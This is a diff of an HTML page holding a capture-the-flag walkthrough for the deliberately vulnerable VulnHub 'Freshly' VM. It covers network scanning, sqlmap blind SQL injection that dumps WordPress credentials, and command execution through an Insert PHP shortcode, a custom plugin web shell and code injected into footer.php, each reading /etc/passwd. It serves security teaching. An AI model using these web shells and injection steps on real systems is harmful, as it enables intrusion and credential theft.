@@ -131,7 +131,7 @@
 <li class="toctree-l4"><a class="reference internal" href="#what-s-at-ports-80-443-8080">3.18.2.3. What’s at ports 80, 443, 8080?</a></li>
 <li class="toctree-l4"><a class="reference internal" href="#wpscan">3.18.2.4. <strong class="program">wpscan</strong></a></li>
 <li class="toctree-l4"><a class="reference internal" href="#spidering-the-web-site">3.18.2.5. Spidering the web site</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#sqlmap-login-php">3.18.2.6. <strong class="program">sqlmap</strong> <code class="file docutils literal"><span class="pre">login.php</span></code></a></li>
+<li class="toctree-l4"><a class="reference internal" href="#sqlmap-login-php">3.18.2.6. <strong class="program">sqlmap</strong> <code class="file docutils literal notranslate"><span class="pre">login.php</span></code></a></li>
 </ul>
 </li>
 <li class="toctree-l3"><a class="reference internal" href="#the-exploit">3.18.3. The Exploit</a><ul>
@@ -241,7 +241,7 @@
 <h3>3.18.1.1. Setting up the VMware VM<a class="headerlink" href="#setting-up-the-vmware-vm" title="Permalink to this headline">¶</a></h3>
 <p>The VM comes packaged as <a class="reference external" href="http://download.vulnhub.com/tophatsec/Freshly.ova">Freshly.ova</a>, which is a tar archive containing a VMware vmdk file.</p>
 <p>See <a class="reference internal" href="VWADP.html#vmsetup"><span class="std std-ref">Traditional VM challenge setup</span></a> for background on using the VMware vmdk file. Freshly is Ubuntu 14.04, x86, and 1024MB memory. For KVM you can use a backing store to undo any changes to the disk:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
 <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
 <span class="nv">VM</span><span class="o">=</span>Freshly
 <span class="nv">BACKING</span><span class="o">=</span><span class="nv">$VM</span>-disk1.vmdk
@@ -256,7 +256,7 @@ tar -xvf Freshly.ova
 </pre></div>
 </div>
 <p>Then Linux KVM could use the VM_DISK to create the Freshly VM. The actual command the author used in Debian Linux to create the VM was (os-variant=ubuntutrusty was not supported on Debian Jessie at this time):</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">VM</span><span class="o">=</span>Freshly
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">VM</span><span class="o">=</span>Freshly
 <span class="nv">$SUDO</span> virt-install <span class="se">\</span>
     --name <span class="s2">&quot;</span><span class="nv">$VM</span><span class="s2">&quot;</span> --cpu host --vcpus <span class="m">1</span> --ram <span class="m">1024</span> <span class="se">\</span>
     --os-type<span class="o">=</span>linux --os-variant<span class="o">=</span>ubuntuprecise <span class="se">\</span>
@@ -279,7 +279,7 @@ tar -xvf Freshly.ova
 </pre></div>
 </div>
 <p>So if Freshly were running and you wanted to “start over again”:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">$SUDO</span> virsh shutdown <span class="nv">$VM</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">$SUDO</span> virsh shutdown <span class="nv">$VM</span>
 <span class="nv">$SUDO</span> virsh undefine <span class="nv">$VM</span>
 <span class="nv">$SUDO</span> qemu-img create -f qcow2 -o <span class="nv">backing_file</span><span class="o">=</span><span class="nv">$BACKING</span>  <span class="nv">$VM_DISK</span>
 <span class="nv">$SUDO</span> virt-install <span class="se">\</span>
@@ -298,7 +298,7 @@ tar -xvf Freshly.ova
 <div class="section" id="directory-setup">
 <h3>3.18.2.1. Directory setup<a class="headerlink" href="#directory-setup" title="Permalink to this headline">¶</a></h3>
 <p>We’ll refer to the following directories below:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">BASE</span><span class="o">=</span><span class="nv">$HOME</span>/local/pentest
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">BASE</span><span class="o">=</span><span class="nv">$HOME</span>/local/pentest
 <span class="nv">LOCATION</span><span class="o">=</span><span class="nv">$BASE</span>/phouse
 <span class="nv">JOB</span><span class="o">=</span><span class="nv">$LOCATION</span>/freshly
 <span class="nv">TOOLS</span><span class="o">=</span>exploit,dirb,hashcat,nikto,nmap,skipfish,sqlmap,wpscan
@@ -309,7 +309,7 @@ tar -xvf Freshly.ova
 <div class="section" id="basic-network-reconnaisance">
 <h3>3.18.2.2. Basic network reconnaisance<a class="headerlink" href="#basic-network-reconnaisance" title="Permalink to this headline">¶</a></h3>
 <p>Start with some standard network reconnaisance looking for the vulnerable host:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
 <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
 <span class="nb">cd</span> <span class="nv">$JOB</span>/nmap
 <span class="nv">NMOUT</span><span class="o">=</span>nmap-phouse
@@ -323,7 +323,7 @@ xsltproc <span class="si">${</span><span class="nv">NMOUT</span><span class="si"
 </pre></div>
 </div>
 <p>Running this gives us:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/nmap$</span> nmap -sn -PE -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn <span class="nv">$SN</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/nmap$</span> nmap -sn -PE -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn <span class="nv">$SN</span>
 <span class="go">Warning:  You are not root -- using TCP pingscan rather than ICMP</span>
 
 <span class="go">Starting Nmap 6.47 ( http://nmap.org ) at 2015-05-02 16:01 PDT</span>
@@ -341,12 +341,12 @@ xsltproc <span class="si">${</span><span class="nv">NMOUT</span><span class="si"
 </pre></div>
 </div>
 <p>At this point we have $TARGETS so scan them:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span>nmap -A -vv -T5 --max-retries <span class="m">0</span> -Pn -iL <span class="nv">$TARGETS</span> -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nmap -A -vv -T5 --max-retries <span class="m">0</span> -Pn -iL <span class="nv">$TARGETS</span> -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A
 xsltproc <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A.xml -o <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A.html
 </pre></div>
 </div>
 <p>Running this gives us:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/nmap$</span> nmap -A -vv -T5 --max-retries <span class="m">0</span> -Pn -iL <span class="nv">$TARGETS</span> -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/nmap$</span> nmap -A -vv -T5 --max-retries <span class="m">0</span> -Pn -iL <span class="nv">$TARGETS</span> -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A
 <span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
 <span class="hll"><span class="go">Discovered open port 8080/tcp on 192.168.1.103</span>
 </span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
@@ -396,13 +396,13 @@ xsltproc <span class="si">${</span><span class="nv">NMOUT</span><span class="si"
 </pre></div>
 </div>
 <p>Our target freshly is T=192.168.1.103 and runs a web server at ports 80, 443, and 8080.</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.103
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.103
 </pre></div>
 </div>
 </div>
 <div class="section" id="what-s-at-ports-80-443-8080">
 <h3>3.18.2.3. What’s at ports 80, 443, 8080?<a class="headerlink" href="#what-s-at-ports-80-443-8080" title="Permalink to this headline">¶</a></h3>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.103
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.103
 <span class="nb">cd</span> <span class="nv">$JOB</span>/exploit
 curl --output freshly_80.txt http://<span class="nv">$T</span>/
 cat freshly_80.txt
@@ -417,14 +417,14 @@ cat freshly_8080.txt
 <div class="section" id="wpscan">
 <h3>3.18.2.4. <strong class="program">wpscan</strong><a class="headerlink" href="#wpscan" title="Permalink to this headline">¶</a></h3>
 <p>Using the wordpress hint we run the <strong class="program">wpscan</strong> tool. It turns out not to be needed for the exploit so if you’re in a rush skip this section.</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$JOB</span>/wpscan
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$JOB</span>/wpscan
 <span class="nv">$SUDO</span> apt-get install wpscan -y
 <span class="nv">$SUDO</span> wpscan --url http://<span class="nv">$T</span>:8080/wordpress/ --random-agent <span class="se">\</span>
    --enumerate u,vp,vt,tt <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> tee wpscan.txt
 </pre></div>
 </div>
 <p>The wpscan output gives us:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/wpscan$ $</span>SUDO wpscan --url http://<span class="nv">$T</span>:8080/wordpress/ --random-agent <span class="se">\</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/wpscan$ $</span>SUDO wpscan --url http://<span class="nv">$T</span>:8080/wordpress/ --random-agent <span class="se">\</span>
 </span><span class="hll">&gt;    --enumerate u,vp,vt,tt <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> tee wpscan.txt
 </span><span class="go">_______________________________________________________________</span>
 <span class="go">        __          _______   _____</span>
@@ -606,15 +606,15 @@ cat freshly_8080.txt
 </div>
 <div class="section" id="spidering-the-web-site">
 <h3>3.18.2.5. Spidering the web site<a class="headerlink" href="#spidering-the-web-site" title="Permalink to this headline">¶</a></h3>
-<p>Next we look for any non-navigable web site files/directories. These tools exist on Kali Linux and could be used: GUI <strong class="program">owasp-zap</strong>, command line <strong class="program">dirb</strong>, command line <strong class="program">skipfish</strong> with html output, and command line <strong class="program">nikto</strong>. Here are runs of <strong class="program">dirb</strong>, <strong class="program">skipfish</strong>, and <strong class="program">nikto</strong>. We stop at looking at <a class="reference external" href="http://$T/">http://$T/</a> and don’t recurse due to finding <code class="file docutils literal"><span class="pre">login.php</span></code> quickly.</p>
+<p>Next we look for any non-navigable web site files/directories. These tools exist on Kali Linux and could be used: GUI <strong class="program">owasp-zap</strong>, command line <strong class="program">dirb</strong>, command line <strong class="program">skipfish</strong> with html output, and command line <strong class="program">nikto</strong>. Here are runs of <strong class="program">dirb</strong>, <strong class="program">skipfish</strong>, and <strong class="program">nikto</strong>. We stop at looking at <a class="reference external" href="http://$T/">http://$T/</a> and don’t recurse due to finding <code class="file docutils literal notranslate"><span class="pre">login.php</span></code> quickly.</p>
 <div class="section" id="dirb">
 <h4>3.18.2.5.1. <strong class="program">dirb</strong><a class="headerlink" href="#dirb" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$JOB</span>/dirb
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$JOB</span>/dirb
 dirb  http://<span class="nv">$T</span>/ -o dirb_html_php -X <span class="s2">&quot;.html,.php&quot;</span>
 </pre></div>
 </div>
 <p>Running this gives us:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/dirb$</span> dirb  http://<span class="nv">$T</span>/ -o dirb_html_php -X <span class="s2">&quot;.html,.php&quot;</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/dirb$</span> dirb  http://<span class="nv">$T</span>/ -o dirb_html_php -X <span class="s2">&quot;.html,.php&quot;</span>
 </span>
 <span class="go">-----------------</span>
 <span class="go">DIRB v2.21</span>
@@ -643,7 +643,7 @@ dirb  http://<span class="nv">$T</span>/ -o dirb_html_php -X <span class="s2">&q
 <div class="section" id="skipfish">
 <h4>3.18.2.5.2. <strong class="program">skipfish</strong><a class="headerlink" href="#skipfish" title="Permalink to this headline">¶</a></h4>
 <p>Trying <strong class="program">skipfish</strong> took more work to speed it up (to exclude some subdirectories). To see what it’s scanning hit the space bar while it runs:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$JOB</span>/skipfish
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$JOB</span>/skipfish
 <span class="nv">MINIMAL</span><span class="o">=</span>/usr/share/skipfish/dictionaries/minimal.wl
 <span class="nv">EXT</span><span class="o">=</span>/usr/share/skipfish/dictionaries/extensions-only.wl
 <span class="nv">DICT</span><span class="o">=</span><span class="s2">&quot;-S </span><span class="nv">$MINIMAL</span><span class="s2"> -S </span><span class="nv">$EXT</span><span class="s2">&quot;</span>
@@ -653,18 +653,18 @@ rm -rf <span class="nv">$REPORT</span>
 skipfish <span class="nv">$SKIP</span> <span class="nv">$DICT</span> -L -o skipfish_minimal http://<span class="nv">$T</span>
 </pre></div>
 </div>
-<p>Running this produces an html report accessible from <code class="file docutils literal"><span class="pre">skipfish_minimal/index.html</span></code> (showing <code class="file docutils literal"><span class="pre">login.php</span></code>).</p>
+<p>Running this produces an html report accessible from <code class="file docutils literal notranslate"><span class="pre">skipfish_minimal/index.html</span></code> (showing <code class="file docutils literal notranslate"><span class="pre">login.php</span></code>).</p>
 </div>
 <div class="section" id="nikto">
 <h4>3.18.2.5.3. <strong class="program">nikto</strong><a class="headerlink" href="#nikto" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.103
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.103
 nikto -output nikto_80.txt -host <span class="nv">$T</span>
 nikto -output nikto_8080.txt -host <span class="nv">$T</span> -port <span class="m">8080</span>
 nikto -output nikto_443.txt -host <span class="nv">$T</span> -port <span class="m">443</span>
 </pre></div>
 </div>
 <p>Running this gives:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/nikto$</span> nikto -output nikto_80.txt -host <span class="nv">$T</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/nikto$</span> nikto -output nikto_80.txt -host <span class="nv">$T</span>
 </span><span class="go">- Nikto v2.1.6</span>
 <span class="go">---------------------------------------------------------------------------</span>
 <span class="hll"><span class="go">+ Target IP:          192.168.1.103</span>
@@ -751,9 +751,9 @@ nikto -output nikto_443.txt -host <span class="nv">$T</span> -port <span class="
 </div>
 </div>
 <div class="section" id="sqlmap-login-php">
-<h3>3.18.2.6. <strong class="program">sqlmap</strong> <code class="file docutils literal"><span class="pre">login.php</span></code><a class="headerlink" href="#sqlmap-login-php" title="Permalink to this headline">¶</a></h3>
+<h3>3.18.2.6. <strong class="program">sqlmap</strong> <code class="file docutils literal notranslate"><span class="pre">login.php</span></code><a class="headerlink" href="#sqlmap-login-php" title="Permalink to this headline">¶</a></h3>
 <p>Looking at the login.php form shows user/password fields which we feed into sqlmap:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/sqlmap$ cd $</span>JOB/sqlmap
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/sqlmap$ cd $</span>JOB/sqlmap
 </span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/sqlmap$</span> curl --silent --remote-name http://<span class="nv">$T</span>/login.php
 </span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/sqlmap$</span> cat login.php
 </span>
@@ -773,14 +773,14 @@ nikto -output nikto_443.txt -host <span class="nv">$T</span> -port <span class="
 </pre></div>
 </div>
 <p>Start with “–dbs” to find if sql injection is possible the databases, then progress to enumerating user accounts for wordpress. It’s quite slow due to being a blink sql injection.</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.103
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.103
 <span class="nv">URL</span><span class="o">=</span>http://<span class="nv">$T</span>/login.php
 sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --random-agent --forms --batch <span class="se">\</span>
     --output-dir <span class="nv">$PWD</span>/sqlmap_login --dbs
 </pre></div>
 </div>
 <p>Running this gives us:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/sqlmap$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.103
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/sqlmap$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.103
 <span class="gp">hacker@kali:~/local/pentest/phouse/freshly/sqlmap$ URL=http://$</span>T/login.php
 <span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/sqlmap$</span> sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --random-agent --forms --batch <span class="se">\</span>
 </span><span class="hll">    --output-dir <span class="nv">$PWD</span>/sqlmap_login --dbs
@@ -807,12 +807,12 @@ sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class=
 </pre></div>
 </div>
 <p>Let’s go after the wordpress8080 MySQL database:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span>sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --random-agent --forms --batch <span class="se">\</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --random-agent --forms --batch <span class="se">\</span>
     --output-dir <span class="nv">$PWD</span>/sqlmap_login -D wordpress8080  --tables
 </pre></div>
 </div>
 <p>Running this shows database wordpress8080 has only a users table:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/sqlmap$</span> sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --random-agent --forms --batch <span class="se">\</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/sqlmap$</span> sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --random-agent --forms --batch <span class="se">\</span>
 </span>    --output-dir <span class="nv">$PWD</span>/sqlmap_login -D wordpress8080  --tables
 <span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
 
@@ -825,11 +825,11 @@ sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class=
 </pre></div>
 </div>
 <p>So let’s dump the users table:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span>sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --random-agent --forms --batch <span class="se">\</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --random-agent --forms --batch <span class="se">\</span>
     --output-dir <span class="nv">$PWD</span>/sqlmap_login -D wordpress8080  -T users --dump
 </pre></div>
 </div>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/sqlmap$</span> sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --random-agent --forms --batch <span class="se">\</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/sqlmap$</span> sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --random-agent --forms --batch <span class="se">\</span>
 </span><span class="hll">    --output-dir <span class="nv">$PWD</span>/sqlmap_login -D wordpress8080  -T users --dump
 </span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
 <span class="hll"><span class="go">Database: wordpress8080</span>
@@ -851,13 +851,13 @@ sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class=
 <div class="section" id="insert-php-plugin">
 <h3>3.18.3.1. Insert PHP Plugin<a class="headerlink" href="#insert-php-plugin" title="Permalink to this headline">¶</a></h3>
 <p>One direct way to exploit WordPress is to add &amp; activate the plugin <a class="reference external" href="https://wordpress.org/plugins/insert-php/">Insert PHP</a> via the <a class="reference external" href="http://$T:8080/wordpress/wp-admin/">http://$T:8080/wordpress/wp-admin/</a> <span class="menuselection">Plugins ‣ Add new ‣ Upload Plugin ‣ Browse ‣ Install now ‣ Activate Plugin</span> menu item. Once you have that, <span class="menuselection">Pages ‣ Add new</span> to add a new page with content:</p>
-<div class="highlight-php"><div class="highlight"><pre><span></span><span class="x">[insert_php]</span>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="x">[insert_php]</span>
 <span class="x">passthru(&#39;id; echo &quot;\n&quot;; cat /etc/passwd;&#39;);</span>
 <span class="x">[/insert_php]</span>
 </pre></div>
 </div>
 <p>Navigating to the page will give you:</p>
-<div class="highlight-text"><div class="highlight"><pre><span></span>uid=1(daemon) gid=1(daemon) groups=1(daemon)
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>uid=1(daemon) gid=1(daemon) groups=1(daemon)
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -891,7 +891,7 @@ candycane:x:1001:1001::/home/candycane:
 <div class="section" id="create-your-own-wordpress-plugin">
 <h3>3.18.3.2. Create your own WordPress plugin<a class="headerlink" href="#create-your-own-wordpress-plugin" title="Permalink to this headline">¶</a></h3>
 <p>An alternative approach is to follow <a class="reference external" href="http://dook.biz/2015/04/vulnhub-tophatsec-freshly-writeup/">Vulnhub – (TopHatSec) Freshly Writeup</a> and create your own WordPress plugin. This has the advantage of password-less access to a page allowing execution of arbitrary shell commands. This author personally likes this one the best.</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$JOB</span>/exploit
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$JOB</span>/exploit
 cat &gt; exploit-plugin.php <span class="s">&lt;&lt;EOF</span>
 <span class="s">&lt;?php</span>
 <span class="s"> /*</span>
@@ -909,11 +909,11 @@ cat &gt; exploit-plugin.php <span class="s">&lt;&lt;EOF</span>
 </pre></div>
 </div>
 <p>Add &amp; activate the plugin via the <a class="reference external" href="http://$T:8080/wordpress/wp-admin/">http://$T:8080/wordpress/wp-admin/</a> <span class="menuselection">Plugins ‣ Add new ‣ Upload Plugin ‣ Browse ‣ Install now ‣ Activate Plugin</span> menu item. To execute arbitrary commands:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span>curl --silent http://<span class="nv">$T</span>:8080/wordpress/wp-content/plugins/exploit-plugin/exploit-plugin.php?cmd<span class="o">=</span>cat%20/etc/passwd
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl --silent http://<span class="nv">$T</span>:8080/wordpress/wp-content/plugins/exploit-plugin/exploit-plugin.php?cmd<span class="o">=</span>cat%20/etc/passwd
 </pre></div>
 </div>
 <p>Running this gives:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/exploit$</span> curl --silent http://<span class="nv">$T</span>:8080/wordpress/wp-content/plugins/exploit-plugin/exploit-plugin.php?cmd<span class="o">=</span>cat%20/etc/passwd
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/exploit$</span> curl --silent http://<span class="nv">$T</span>:8080/wordpress/wp-content/plugins/exploit-plugin/exploit-plugin.php?cmd<span class="o">=</span>cat%20/etc/passwd
 </span><span class="go">root:x:0:0:root:/root:/bin/bash</span>
 <span class="go">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span>
 <span class="go">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span>
@@ -945,17 +945,17 @@ cat &gt; exploit-plugin.php <span class="s">&lt;&lt;EOF</span>
 </div>
 <div class="section" id="put-php-in-footer-php">
 <h3>3.18.3.3. Put php in footer.php<a class="headerlink" href="#put-php-in-footer-php" title="Permalink to this headline">¶</a></h3>
-<p>An alternative approach is to follow <a class="reference external" href="http://matthieukeller.com/2015/04/vulnhub-freshly.html">Vulnhub - Freshly</a> and add exploit php code to the footer.php file (making the modifications very obvious to all WordPress users). On the <a class="reference external" href="http://$T:8080/wordpress/wp-admin/">http://$T:8080/wordpress/wp-admin/</a> admin page select <span class="menuselection">Appearance ‣ Editor ‣ Footer (footer.php)</span>, add the following php code to <code class="file docutils literal"><span class="pre">footer.php</span></code> just prior to the “&lt;/body&gt;” tag, then select <span class="menuselection">Update File</span>:</p>
-<div class="highlight-php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> <span class="nb">passthru</span><span class="p">(</span><span class="s1">&#39;cat /etc/passwd&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"></span>
+<p>An alternative approach is to follow <a class="reference external" href="http://matthieukeller.com/2015/04/vulnhub-freshly.html">Vulnhub - Freshly</a> and add exploit php code to the footer.php file (making the modifications very obvious to all WordPress users). On the <a class="reference external" href="http://$T:8080/wordpress/wp-admin/">http://$T:8080/wordpress/wp-admin/</a> admin page select <span class="menuselection">Appearance ‣ Editor ‣ Footer (footer.php)</span>, add the following php code to <code class="file docutils literal notranslate"><span class="pre">footer.php</span></code> just prior to the “&lt;/body&gt;” tag, then select <span class="menuselection">Update File</span>:</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> <span class="nb">passthru</span><span class="p">(</span><span class="s1">&#39;cat /etc/passwd&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"></span>
 </pre></div>
 </div>
 <p>To perform the exploit:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span>curl --silent http://<span class="nv">$T</span>:8080/wordpress/ <span class="p">|</span> <span class="se">\</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl --silent http://<span class="nv">$T</span>:8080/wordpress/ <span class="p">|</span> <span class="se">\</span>
     sed -n <span class="s1">&#39;/^root/,$p&#39;</span>
 </pre></div>
 </div>
 <p>Running this gives:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/exploit$</span> curl --silent http://<span class="nv">$T</span>:8080/wordpress/ <span class="p">|</span> sed -n <span class="s1">&#39;/^root/,$p&#39;</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/exploit$</span> curl --silent http://<span class="nv">$T</span>:8080/wordpress/ <span class="p">|</span> sed -n <span class="s1">&#39;/^root/,$p&#39;</span>
 </span><span class="go">root:x:0:0:root:/root:/bin/bash</span>
 <span class="go">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span>
 <span class="go">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span>
@@ -989,42 +989,42 @@ cat &gt; exploit-plugin.php <span class="s">&lt;&lt;EOF</span>
 </div>
 <div class="section" id="getting-a-reverse-shell-and-root">
 <h3>3.18.3.4. Getting a reverse shell and root<a class="headerlink" href="#getting-a-reverse-shell-and-root" title="Permalink to this headline">¶</a></h3>
